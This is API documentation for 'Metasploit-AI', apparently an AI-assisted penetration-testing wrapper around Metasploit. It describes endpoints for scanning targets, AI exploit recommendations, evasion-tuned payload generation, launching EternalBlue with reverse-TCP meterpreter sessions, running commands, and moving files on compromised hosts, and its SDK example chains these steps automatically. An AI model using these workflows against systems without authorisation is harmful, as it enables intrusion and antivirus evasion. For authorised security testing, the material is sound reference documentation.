# API Documentation

Complete reference for the Metasploit-AI REST API, enabling integration with external tools and custom applications.

## Table of Contents

1. [API Overview](#api-overview)
2. [Authentication](#authentication)
3. [Rate Limiting](#rate-limiting)
4. [Error Handling](#error-handling)
5. [Core Endpoints](#core-endpoints)
6. [Target Management](#target-management)
7. [Scanning Operations](#scanning-operations)
8. [AI Analysis](#ai-analysis)
9. [Exploitation](#exploitation)
10. [Session Management](#session-management)
11. [Reporting](#reporting)
12. [WebSocket Events](#websocket-events)
13. [SDKs and Examples](#sdks-and-examples)

## API Overview

### Base Information

**Base URL:** `https://api.metasploit-ai.local/v1`  
**Protocol:** HTTPS (TLS 1.2+)  
**Data Format:** JSON  
**Authentication:** Bearer Token (JWT)  
**API Version:** 1.0  

### API Principles

- **RESTful Design**: Standard HTTP methods and status codes
- **Consistent Responses**: Uniform response structure across endpoints
- **Stateless**: Each request contains all necessary information
- **Idempotent**: Safe to retry GET, PUT, DELETE operations
- **Versioned**: API version included in URL path

### Standard Response Format

```json
{
  "success": true,
  "data": {
    // Response data here
  },
  "metadata": {
    "timestamp": "2025-07-31T12:00:00Z",
    "request_id": "req_123456789",
    "version": "1.0.0"
  },
  "pagination": {
    "page": 1,
    "per_page": 50,
    "total": 150,
    "pages": 3
  }
}
```

## Authentication

### JWT Token Authentication

**Obtain Access Token:**
```http
POST /auth/login
Content-Type: application/json

{
  "username": "your_username",
  "password": "your_password"
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "refresh_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "expires_in": 3600,
    "token_type": "Bearer"
  }
}
```

**Using Access Token:**
```http
GET /targets
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

### Token Refresh

```http
POST /auth/refresh
Content-Type: application/json

{
  "refresh_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```

### API Key Authentication (Alternative)

```http
GET /targets
X-API-Key: your_api_key_here
```

## Rate Limiting

### Rate Limit Headers

```http
X-RateLimit-Limit: 1000
X-RateLimit-Remaining: 950
X-RateLimit-Reset: 1643723400
X-RateLimit-Window: 3600
```

### Rate Limit Tiers

| Tier | Requests/Hour | Concurrent | Description |
|------|---------------|------------|-------------|
| Basic | 1,000 | 10 | Standard users |
| Professional | 5,000 | 25 | Professional users |
| Enterprise | 10,000 | 50 | Enterprise customers |
| Internal | Unlimited | 100 | Internal tools |

### Rate Limit Exceeded Response

```json
{
  "success": false,
  "error": {
    "code": "RATE_LIMIT_EXCEEDED",
    "message": "Rate limit exceeded. Try again in 300 seconds.",
    "details": {
      "retry_after": 300,
      "limit": 1000,
      "window": 3600
    }
  }
}
```

## Error Handling

### Standard Error Response

```json
{
  "success": false,
  "error": {
    "code": "VALIDATION_ERROR",
    "message": "Invalid target format",
    "details": {
      "field": "target",
      "provided": "invalid_ip",
      "expected": "IP address or hostname"
    }
  },
  "metadata": {
    "timestamp": "2025-07-31T12:00:00Z",
    "request_id": "req_123456789"
  }
}
```

### HTTP Status Codes

| Code | Meaning | Description |
|------|---------|-------------|
| 200 | OK | Request successful |
| 201 | Created | Resource created successfully |
| 400 | Bad Request | Invalid request parameters |
| 401 | Unauthorized | Authentication required |
| 403 | Forbidden | Insufficient permissions |
| 404 | Not Found | Resource not found |
| 409 | Conflict | Resource already exists |
| 422 | Unprocessable Entity | Validation error |
| 429 | Too Many Requests | Rate limit exceeded |
| 500 | Internal Server Error | Server error |
| 503 | Service Unavailable | Service temporarily unavailable |

### Error Codes

| Code | Description |
|------|-------------|
| `AUTHENTICATION_FAILED` | Invalid credentials |
| `AUTHORIZATION_FAILED` | Insufficient permissions |
| `VALIDATION_ERROR` | Request validation failed |
| `RESOURCE_NOT_FOUND` | Requested resource not found |
| `RESOURCE_CONFLICT` | Resource already exists |
| `RATE_LIMIT_EXCEEDED` | API rate limit exceeded |
| `INTERNAL_ERROR` | Internal server error |
| `SERVICE_UNAVAILABLE` | Service temporarily unavailable |

## Core Endpoints

### Health Check

**GET /health**

Check API health and status.

```http
GET /health
```

**Response:**
```json
{
  "success": true,
  "data": {
    "status": "healthy",
    "version": "1.0.0",
    "uptime": 86400,
    "components": {
      "database": "healthy",
      "metasploit": "healthy",
      "ai_models": "healthy"
    }
  }
}
```

### System Information

**GET /system/info**

Get system information and statistics.

```http
GET /system/info
Authorization: Bearer <token>
```

**Response:**
```json
{
  "success": true,
  "data": {
    "version": "1.0.0",
    "build": "20250731",
    "statistics": {
      "targets": 1250,
      "scans": 5432,
      "vulnerabilities": 8765,
      "active_sessions": 12
    },
    "ai_models": {
      "vulnerability_analyzer": "loaded",
      "exploit_recommender": "loaded",
      "payload_generator": "loaded"
    }
  }
}
```

## Target Management

### List Targets

**GET /targets**

Retrieve list of targets with optional filtering.

```http
GET /targets?status=active&os_type=linux&page=1&per_page=50
Authorization: Bearer <token>
```

**Query Parameters:**
- `status` (string): Filter by status (active, inactive, unknown)
- `os_type` (string): Filter by OS type (linux, windows, macos, other)
- `severity` (string): Filter by highest vulnerability severity
- `page` (integer): Page number (default: 1)
- `per_page` (integer): Items per page (default: 50, max: 100)
- `search` (string): Search in IP address or hostname

**Response:**
```json
{
  "success": true,
  "data": {
    "targets": [
      {
        "id": 1,
        "ip_address": "192.168.1.100",
        "hostname": "web-server-01",
        "os_type": "linux",
        "status": "active",
        "first_seen": "2025-07-01T10:00:00Z",
        "last_seen": "2025-07-31T12:00:00Z",
        "vulnerability_count": 15,
        "highest_severity": "high",
        "open_ports": [22, 80, 443, 3306],
        "tags": ["web", "production", "critical"]
      }
    ]
  },
  "pagination": {
    "page": 1,
    "per_page": 50,
    "total": 125,
    "pages": 3
  }
}
```

### Get Target Details

**GET /targets/{target_id}**

Get detailed information about a specific target.

```http
GET /targets/1
Authorization: Bearer <token>
```

**Response:**
```json
{
  "success": true,
  "data": {
    "id": 1,
    "ip_address": "192.168.1.100",
    "hostname": "web-server-01",
    "os_type": "linux",
    "os_version": "Ubuntu 20.04.3 LTS",
    "status": "active",
    "first_seen": "2025-07-01T10:00:00Z",
    "last_seen": "2025-07-31T12:00:00Z",
    "services": [
      {
        "port": 22,
        "protocol": "tcp",
        "service": "ssh",
        "version": "OpenSSH 8.2p1",
        "state": "open"
      },
      {
        "port": 80,
        "protocol": "tcp",
        "service": "http",
        "version": "Apache httpd 2.4.41",
        "state": "open"
      }
    ],
    "vulnerabilities": [
      {
        "id": 101,
        "cve_id": "CVE-2021-3156",
        "title": "Sudo Heap-Based Buffer Overflow",
        "severity": "high",
        "cvss_score": 7.8,
        "exploit_available": true
      }
    ],
    "sessions": [
      {
        "id": 1,
        "type": "meterpreter",
        "user": "www-data",
        "created_at": "2025-07-31T11:30:00Z",
        "status": "active"
      }
    ],
    "metadata": {
      "notes": "Production web server",
      "business_impact": "high"
    }
  }
}
```

### Add Target

**POST /targets**

Add a new target or targets to the system.

```http
POST /targets
Authorization: Bearer <token>
Content-Type: application/json

{
  "targets": [
    {
      "ip_address": "192.168.1.101",
      "hostname": "database-server",
      "tags": ["database", "production"],
      "metadata": {
        "environment": "production",
        "owner": "dev-team"
      }
    },
    "192.168.1.102",
    "192.168.1.0/24"
  ]
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "created": [
      {
        "id": 126,
        "ip_address": "192.168.1.101",
        "hostname": "database-server"
      }
    ],
    "errors": []
  }
}
```

### Update Target

**PUT /targets/{target_id}**

Update target information.

```http
PUT /targets/1
Authorization: Bearer <token>
Content-Type: application/json

{
  "hostname": "updated-hostname",
  "tags": ["web", "production", "updated"],
  "metadata": {
    "environment": "production",
    "last_patched": "2025-07-30"
  }
}
```

### Delete Target

**DELETE /targets/{target_id}**

Remove a target from the system.

```http
DELETE /targets/1
Authorization: Bearer <token>
```

**Response:**
```json
{
  "success": true,
  "data": {
    "message": "Target deleted successfully"
  }
}
```

## Scanning Operations

### List Scans

**GET /scans**

Get list of scans with filtering options.

```http
GET /scans?status=completed&target_id=1&scan_type=vulnerability
Authorization: Bearer <token>
```

**Query Parameters:**
- `status` (string): Filter by status (pending, running, completed, failed)
- `target_id` (integer): Filter by target ID
- `scan_type` (string): Filter by scan type
- `start_date` (string): Filter by start date (ISO 8601)
- `end_date` (string): Filter by end date (ISO 8601)

**Response:**
```json
{
  "success": true,
  "data": {
    "scans": [
      {
        "id": 1001,
        "target_id": 1,
        "target_ip": "192.168.1.100",
        "scan_type": "vulnerability",
        "status": "completed",
        "started_at": "2025-07-31T10:00:00Z",
        "completed_at": "2025-07-31T10:15:00Z",
        "duration": 900,
        "vulnerabilities_found": 8,
        "progress": 100
      }
    ]
  }
}
```

### Start Scan

**POST /scans**

Initiate a new scan against one or more targets.

```http
POST /scans
Authorization: Bearer <token>
Content-Type: application/json

{
  "targets": ["192.168.1.100", "192.168.1.101"],
  "scan_type": "comprehensive",
  "options": {
    "port_range": "1-65535",
    "timing": "normal",
    "scripts": true,
    "version_detection": true,
    "os_detection": true,
    "stealth_mode": false
  },
  "schedule": {
    "immediate": true
  }
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "scan_id": 1002,
    "targets": ["192.168.1.100", "192.168.1.101"],
    "status": "pending",
    "estimated_duration": 1800,
    "message": "Scan queued successfully"
  }
}
```

### Get Scan Details

**GET /scans/{scan_id}**

Get detailed information about a specific scan.

```http
GET /scans/1001
Authorization: Bearer <token>
```

**Response:**
```json
{
  "success": true,
  "data": {
    "id": 1001,
    "target_id": 1,
    "scan_type": "vulnerability",
    "status": "completed",
    "started_at": "2025-07-31T10:00:00Z",
    "completed_at": "2025-07-31T10:15:00Z",
    "duration": 900,
    "progress": 100,
    "results": {
      "hosts_scanned": 1,
      "ports_scanned": 65535,
      "services_detected": 8,
      "vulnerabilities_found": 15
    },
    "vulnerabilities": [
      {
        "cve_id": "CVE-2021-3156",
        "title": "Sudo Heap-Based Buffer Overflow",
        "severity": "high",
        "cvss_score": 7.8,
        "port": 22,
        "service": "ssh"
      }
    ],
    "options": {
      "port_range": "1-65535",
      "timing": "normal"
    }
  }
}
```

### Cancel Scan

**DELETE /scans/{scan_id}**

Cancel a running scan.

```http
DELETE /scans/1002
Authorization: Bearer <token>
```

### Get Scan Results

**GET /scans/{scan_id}/results**

Get detailed scan results.

```http
GET /scans/1001/results?format=json
Authorization: Bearer <token>
```

**Query Parameters:**
- `format` (string): Result format (json, xml, csv)

## AI Analysis

### Analyze Vulnerabilities

**POST /ai/analyze/vulnerabilities**

Perform AI analysis on vulnerabilities.

```http
POST /ai/analyze/vulnerabilities
Authorization: Bearer <token>
Content-Type: application/json

{
  "target_ids": [1, 2, 3],
  "analysis_type": "risk_assessment",
  "options": {
    "include_exploitability": true,
    "include_impact": true,
    "include_recommendations": true
  }
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "analysis_id": "ai_001",
    "status": "completed",
    "confidence": 0.94,
    "results": {
      "overall_risk": "high",
      "critical_vulnerabilities": 3,
      "exploitable_vulnerabilities": 8,
      "recommendations": [
        {
          "priority": "high",
          "action": "patch_immediately",
          "vulnerabilities": ["CVE-2021-34527", "CVE-2021-3156"],
          "impact": "Remote code execution possible"
        }
      ]
    },
    "processing_time": 2.3
  }
}
```

### Get Exploit Recommendations

**GET /ai/recommendations/exploits**

Get AI-powered exploit recommendations.

```http
GET /ai/recommendations/exploits?target_id=1&min_success_rate=0.7
Authorization: Bearer <token>
```

**Query Parameters:**
- `target_id` (integer): Target ID for recommendations
- `vulnerability_id` (integer): Specific vulnerability ID
- `min_success_rate` (float): Minimum success rate threshold
- `max_results` (integer): Maximum number of recommendations

**Response:**
```json
{
  "success": true,
  "data": {
    "recommendations": [
      {
        "exploit_name": "exploit/linux/local/sudo_baron_samedit",
        "cve_id": "CVE-2021-3156",
        "success_rate": 0.95,
        "difficulty": "easy",
        "impact": "privilege_escalation",
        "description": "Sudo heap-based buffer overflow",
        "requirements": {
          "access_level": "local",
          "privileges": "low"
        },
        "payloads": [
          {
            "name": "cmd/unix/reverse",
            "platform": "linux",
            "arch": "x64"
          }
        ]
      }
    ],
    "ai_confidence": 0.91,
    "analysis_timestamp": "2025-07-31T12:00:00Z"
  }
}
```

### Generate Payload

**POST /ai/generate/payload**

Generate AI-optimized payload for specific target.

```http
POST /ai/generate/payload
Authorization: Bearer <token>
Content-Type: application/json

{
  "target_id": 1,
  "exploit_name": "exploit/windows/smb/ms17_010_eternalblue",
  "payload_type": "meterpreter",
  "options": {
    "architecture": "x64",
    "platform": "windows",
    "evasion_level": "high",
    "encode": true,
    "iterations": 3
  }
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "payload_id": "payload_001",
    "payload_data": "base64_encoded_payload_here",
    "payload_info": {
      "size": 4096,
      "type": "windows/x64/meterpreter/reverse_tcp",
      "encoded": true,
      "evasion_techniques": ["polymorphic", "anti_debug", "anti_vm"]
    },
    "configuration": {
      "lhost": "192.168.1.50",
      "lport": 4444,
      "encoder": "x64/xor_dynamic"
    },
    "ai_optimizations": {
      "success_probability": 0.87,
      "detection_probability": 0.12,
      "stealth_score": 8.5
    }
  }
}
```

## Exploitation

### List Available Exploits

**GET /exploits**

Get list of available exploits with filtering.

```http
GET /exploits?platform=windows&type=remote&search=smb
Authorization: Bearer <token>
```

**Query Parameters:**
- `platform` (string): Filter by platform (windows, linux, macos, etc.)
- `type` (string): Filter by type (remote, local, webapp, etc.)
- `rank` (string): Filter by reliability rank (excellent, great, good, etc.)
- `search` (string): Search in exploit name or description

**Response:**
```json
{
  "success": true,
  "data": {
    "exploits": [
      {
        "name": "exploit/windows/smb/ms17_010_eternalblue",
        "title": "MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption",
        "platform": "windows",
        "type": "remote",
        "rank": "excellent",
        "cve_ids": ["CVE-2017-0143", "CVE-2017-0144"],
        "targets": ["Windows 7", "Windows Server 2008"],
        "payloads": ["windows/x64/meterpreter/reverse_tcp"],
        "description": "This exploit targets the SMBv1 vulnerability...",
        "references": [
          "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010"
        ]
      }
    ]
  }
}
```

### Execute Exploit

**POST /exploits/execute**

Execute an exploit against a target.

```http
POST /exploits/execute
Authorization: Bearer <token>
Content-Type: application/json

{
  "target_id": 1,
  "exploit_name": "exploit/windows/smb/ms17_010_eternalblue",
  "payload": "windows/x64/meterpreter/reverse_tcp",
  "options": {
    "RHOSTS": "192.168.1.100",
    "RPORT": 445,
    "LHOST": "192.168.1.50",
    "LPORT": 4444
  },
  "advanced_options": {
    "VERBOSE": true,
    "CheckModule": true
  }
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "execution_id": "exec_001",
    "status": "running",
    "target": "192.168.1.100",
    "exploit": "exploit/windows/smb/ms17_010_eternalblue",
    "started_at": "2025-07-31T12:00:00Z",
    "estimated_duration": 60,
    "message": "Exploit execution initiated"
  }
}
```

### Get Exploitation Status

**GET /exploits/execute/{execution_id}**

Get status of exploit execution.

```http
GET /exploits/execute/exec_001
Authorization: Bearer <token>
```

**Response:**
```json
{
  "success": true,
  "data": {
    "execution_id": "exec_001",
    "status": "completed",
    "result": "success",
    "target": "192.168.1.100",
    "exploit": "exploit/windows/smb/ms17_010_eternalblue",
    "started_at": "2025-07-31T12:00:00Z",
    "completed_at": "2025-07-31T12:01:30Z",
    "duration": 90,
    "session_created": true,
    "session_id": 15,
    "output": [
      "[*] Started reverse TCP handler on 192.168.1.50:4444",
      "[*] Sending stage (200262 bytes) to 192.168.1.100",
      "[*] Meterpreter session 15 opened"
    ],
    "ai_analysis": {
      "success_factors": ["target_vulnerable", "correct_payload"],
      "performance_score": 9.2
    }
  }
}
```

## Session Management

### List Sessions

**GET /sessions**

Get list of active sessions.

```http
GET /sessions?status=active&target_id=1
Authorization: Bearer <token>
```

**Query Parameters:**
- `status` (string): Filter by status (active, closed, error)
- `target_id` (integer): Filter by target ID
- `session_type` (string): Filter by session type (meterpreter, shell, etc.)

**Response:**
```json
{
  "success": true,
  "data": {
    "sessions": [
      {
        "id": 15,
        "target_id": 1,
        "target_ip": "192.168.1.100",
        "session_type": "meterpreter",
        "user_context": "SYSTEM",
        "architecture": "x64",
        "platform": "windows",
        "created_at": "2025-07-31T12:01:30Z",
        "last_activity": "2025-07-31T12:05:00Z",
        "status": "active",
        "tunnel": "192.168.1.100:49152 -> 192.168.1.50:4444",
        "capabilities": ["stdapi", "priv", "mimikatz"]
      }
    ]
  }
}
```

### Get Session Details

**GET /sessions/{session_id}**

Get detailed information about a session.

```http
GET /sessions/15
Authorization: Bearer <token>
```

**Response:**
```json
{
  "success": true,
  "data": {
    "id": 15,
    "target_id": 1,
    "target_ip": "192.168.1.100",
    "session_type": "meterpreter",
    "user_context": "SYSTEM",
    "architecture": "x64",
    "platform": "windows",
    "created_at": "2025-07-31T12:01:30Z",
    "last_activity": "2025-07-31T12:05:00Z",
    "status": "active",
    "system_info": {
      "computer": "WIN-SERVER2019",
      "os": "Windows Server 2019 Standard",
      "domain": "WORKGROUP",
      "logged_users": 2
    },
    "privileges": {
      "current_user": "NT AUTHORITY\\SYSTEM",
      "is_admin": true,
      "is_system": true,
      "token_privileges": ["SeDebugPrivilege", "SeBackupPrivilege"]
    },
    "network_info": {
      "routes": ["0.0.0.0/0 -> 192.168.1.1"],
      "interfaces": [
        {
          "name": "Ethernet",
          "ip": "192.168.1.100",
          "netmask": "255.255.255.0"
        }
      ]
    }
  }
}
```

### Execute Command

**POST /sessions/{session_id}/execute**

Execute a command in the session.

```http
POST /sessions/15/execute
Authorization: Bearer <token>
Content-Type: application/json

{
  "command": "sysinfo",
  "timeout": 30
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "command": "sysinfo",
    "output": "Computer        : WIN-SERVER2019\nOS              : Windows Server 2019\n...",
    "execution_time": 1.2,
    "exit_code": 0
  }
}
```

### Upload File

**POST /sessions/{session_id}/upload**

Upload a file to the target system.

```http
POST /sessions/15/upload
Authorization: Bearer <token>
Content-Type: multipart/form-data

file=@/path/to/local/file.txt
remote_path=C:\temp\uploaded_file.txt
```

### Download File

**POST /sessions/{session_id}/download**

Download a file from the target system.

```http
POST /sessions/15/download
Authorization: Bearer <token>
Content-Type: application/json

{
  "remote_path": "C:\\temp\\important_file.txt"
}
```

### Kill Session

**DELETE /sessions/{session_id}**

Terminate a session.

```http
DELETE /sessions/15
Authorization: Bearer <token>
```

## Reporting

### Generate Report

**POST /reports**

Generate a security assessment report.

```http
POST /reports
Authorization: Bearer <token>
Content-Type: application/json

{
  "report_type": "executive_summary",
  "targets": [1, 2, 3],
  "format": "pdf",
  "options": {
    "include_executive_summary": true,
    "include_technical_details": true,
    "include_recommendations": true,
    "severity_filter": "medium",
    "date_range": {
      "start": "2025-07-01",
      "end": "2025-07-31"
    }
  }
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "report_id": "report_001",
    "status": "generating",
    "estimated_completion": "2025-07-31T12:10:00Z",
    "download_url": null
  }
}
```

### Get Report Status

**GET /reports/{report_id}**

Check report generation status.

```http
GET /reports/report_001
Authorization: Bearer <token>
```

**Response:**
```json
{
  "success": true,
  "data": {
    "report_id": "report_001",
    "status": "completed",
    "format": "pdf",
    "file_size": 2048576,
    "created_at": "2025-07-31T12:05:00Z",
    "download_url": "/api/v1/reports/report_001/download",
    "expires_at": "2025-08-07T12:05:00Z"
  }
}
```

### Download Report

**GET /reports/{report_id}/download**

Download the generated report.

```http
GET /reports/report_001/download
Authorization: Bearer <token>
```

## WebSocket Events

### Connection

Connect to WebSocket for real-time updates:

```javascript
const ws = new WebSocket('wss://api.metasploit-ai.local/v1/ws');
ws.onopen = function() {
  // Send authentication
  ws.send(JSON.stringify({
    type: 'authenticate',
    token: 'your_jwt_token'
  }));
};
```

### Event Types

**Scan Events:**
```json
{
  "type": "scan_started",
  "data": {
    "scan_id": 1002,
    "target": "192.168.1.100",
    "timestamp": "2025-07-31T12:00:00Z"
  }
}

{
  "type": "scan_progress",
  "data": {
    "scan_id": 1002,
    "progress": 45,
    "current_activity": "Port scanning 192.168.1.100"
  }
}

{
  "type": "scan_completed",
  "data": {
    "scan_id": 1002,
    "vulnerabilities_found": 8,
    "duration": 900
  }
}
```

**Exploitation Events:**
```json
{
  "type": "exploitation_started",
  "data": {
    "execution_id": "exec_001",
    "target": "192.168.1.100",
    "exploit": "ms17_010_eternalblue"
  }
}

{
  "type": "session_opened",
  "data": {
    "session_id": 15,
    "target": "192.168.1.100",
    "session_type": "meterpreter",
    "user": "SYSTEM"
  }
}
```

## SDKs and Examples

### Python SDK Example

```python
import requests
from metasploit_ai_sdk import MetasploitAI

# Initialize client
client = MetasploitAI(
    base_url="https://api.metasploit-ai.local/v1",
    api_key="your_api_key"
)

# Authenticate
client.authenticate("username", "password")

# Add targets
targets = client.targets.add(["192.168.1.100", "192.168.1.0/24"])

# Start scan
scan = client.scans.create(
    targets=["192.168.1.100"],
    scan_type="comprehensive"
)

# Wait for completion
scan.wait_for_completion()

# Get AI recommendations
recommendations = client.ai.get_exploit_recommendations(
    target_id=targets[0].id,
    min_success_rate=0.8
)

# Execute exploit
if recommendations:
    exploit = recommendations[0]
    execution = client.exploits.execute(
        target_id=targets[0].id,
        exploit_name=exploit.name,
        payload=exploit.payloads[0]
    )
    
    if execution.success:
        session = execution.session
        result = session.execute("whoami")
        print(f"Command result: {result.output}")
```

### cURL Examples

**Basic Authentication:**
```bash
curl -X POST https://api.metasploit-ai.local/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"password"}'
```

**List Targets:**
```bash
curl -X GET https://api.metasploit-ai.local/v1/targets \
  -H "Authorization: Bearer your_token_here"
```

**Start Scan:**
```bash
curl -X POST https://api.metasploit-ai.local/v1/scans \
  -H "Authorization: Bearer your_token_here" \
  -H "Content-Type: application/json" \
  -d '{
    "targets": ["192.168.1.100"],
    "scan_type": "vulnerability",
    "options": {"timing": "normal"}
  }'
```

### JavaScript/Node.js Example

```javascript
const axios = require('axios');

class MetasploitAIClient {
  constructor(baseURL, apiKey) {
    this.client = axios.create({
      baseURL: baseURL,
      headers: {
        'X-API-Key': apiKey,
        'Content-Type': 'application/json'
      }
    });
  }

  async getTargets(filters = {}) {
    const response = await this.client.get('/targets', { params: filters });
    return response.data.data.targets;
  }

  async startScan(targets, scanType = 'comprehensive') {
    const response = await this.client.post('/scans', {
      targets: targets,
      scan_type: scanType
    });
    return response.data.data;
  }

  async getAIRecommendations(targetId) {
    const response = await this.client.get('/ai/recommendations/exploits', {
      params: { target_id: targetId }
    });
    return response.data.data.recommendations;
  }
}

// Usage
const client = new MetasploitAIClient(
  'https://api.metasploit-ai.local/v1',
  'your_api_key'
);

async function main() {
  try {
    const targets = await client.getTargets({ status: 'active' });
    console.log(`Found ${targets.length} active targets`);

    if (targets.length > 0) {
      const recommendations = await client.getAIRecommendations(targets[0].id);
      console.log(`AI recommendations:`, recommendations);
    }
  } catch (error) {
    console.error('API Error:', error.response?.data || error.message);
  }
}

main();
```

---

*This API documentation is part of the Metasploit-AI documentation suite. For more information, see the [User Manual](user-manual.md) or visit the [project repository](https://github.com/yashab-cyber/metasploit-ai).*

---

*Created by [Yashab Alam](https://github.com/yashab-cyber) and the [ZehraSec](https://www.zehrasec.com) Team*
